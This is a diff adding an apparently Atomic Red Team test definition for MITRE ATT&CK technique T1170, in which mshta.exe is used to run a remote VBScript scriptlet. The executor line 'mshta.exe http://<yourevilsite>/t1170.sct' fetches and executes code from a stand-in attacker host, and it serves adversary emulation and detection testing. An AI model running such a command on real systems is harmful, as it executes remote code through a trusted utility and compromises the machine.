@@ -1,0 +1,25 @@
+---
+attack_technique: T1170
+display_name: Mshta
+tactic: Defense Evasion, Execution
+description: Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility.
+
+atomic_tests:
+- name: Mshta executes VBScript scriptlet remote payload
+  description: |
+    Test execution of a remote script using mshta.exe
+
+  supported_platforms:
+    - windows
+    
+  input_arguments:
+    file_url:
+      description: location of the payload
+      type: Url
+      default: http://<URL>/T1170.sct
+
+  executor_cmd:
+    name: command_prompt
+    command: |
+      mshta.exe http://<yourevilsite>/t1170.sct
+      
